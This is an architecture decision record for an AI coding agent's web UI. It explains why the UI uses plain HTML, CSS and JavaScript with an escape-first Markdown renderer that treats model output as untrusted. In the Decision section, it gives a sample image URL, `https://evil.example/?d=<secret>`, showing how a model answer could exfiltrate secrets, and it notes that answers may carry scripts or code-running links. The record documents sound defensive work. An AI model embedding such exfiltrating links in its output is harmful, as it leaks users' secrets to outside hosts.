# 0052. The page is plain HTML, CSS and JavaScript, and model text becomes HTML only through an escape-first renderer

- **Status:** Accepted
- **Date:** 2026-10-08

## Context
The web UI (ADR 0051) needs a real page: the conversation with Markdown answers, the files of the workspace, the agent's run as it
happens, command output, the todo list, and the controls. Everything the model writes is untrusted (ADR 0028): an answer can contain
HTML, a script, a link that runs code, or a picture whose address carries data to another site. The page runs with the server's
key, so a script in it could do anything you can.

## Options
1. **A framework and a build step** (React, Svelte ...): components and state management, plus Node, a bundler and a dependency tree
   for a Python project.
2. **Libraries from a CDN** (marked, DOMPurify, KaTeX, a graph library): no build, but the page then loads code from another site on
   every visit, doesn't work offline, and the CDN sees every visit.
3. **Plain HTML, CSS and JavaScript, written here**: one stylesheet, two scripts, no build, no outside requests.

## Decision
Option 3 (`harness/web/static/`: `index.html`, `app.css`, `markdown.js`, `app.js`, `icon.svg`).

- **Markdown** (`markdown.js`): escape every character that means something in HTML first, then add the tags the renderer chooses
  (paragraphs, headings, lists, tables, quotes, code, bold, italic, links). Raw HTML in an answer is shown as text. **Pictures are never
  loaded**: `![x](url)` becomes the words *[image: x]*, because the address of a picture is fetched without a click and can carry data
  out (`https://evil.example/?d=<secret>`). **Links** only to `http(s)`, opening in a new tab with `rel="noopener noreferrer"`.
  Everything else goes into the page with `textContent`. Pure functions, tested in Node against attack strings.
- **Code** gets a small highlighter (comments, strings, numbers, keywords, calls) that escapes each piece it emits.
- **Math** is converted to Unicode on the server by the terminal's converter (ADR 0023) and sent with the answer as `markdown`, so
  the page needs no math library. Display formulas arrive as quotes and are styled as such.
- **The run graph** is SVG with a small force layout written here (repulsion, springs to the parent, a pull to the centre): requests,
  their tool calls, sub-agents and answers; at most 160 nodes, the oldest dropped.
- **One renderer for both paths**: the conversation from `/api/state` and the live stream go through the same function, so a reload
  draws what the live page drew.
- **The explorer and the viewer** read through the workspace's jail (ADR 0025), skip the folders the agent's tools skip, show at most
  200 KB of a text file, and hide secrets with the audit log's redactor (ADR 0031): the page may be on a shared screen.

## Consequences
- Measured: the page is about 52 KB in five files, every request goes to `127.0.0.1`, 21.6 KB of Markdown renders in 3.0 ms, a graph
  step with 160 nodes takes 2.5 ms.
- It works offline and a strict Content-Security-Policy (`script-src 'self'`) fits it without changes.
- The renderer covers the Markdown models write, not all of CommonMark (no nested lists beyond one level, no reference links, no HTML).
- Typeset math would need KaTeX or MathML: Unicode reads well for the formulas a coding agent writes, and costs nothing.
- Writing the file viewer found a bug elsewhere: the redactor was quadratic on long words. A tool result (at most 8,000 characters) of
  base64 took about 1 s to check; the 200 KB the viewer reads took minutes. Its unbounded patterns now start only where a word starts
  and are bounded: the same result takes about 1 ms, and 100 KB of any of 255 adversarial shapes under 0.2 s.
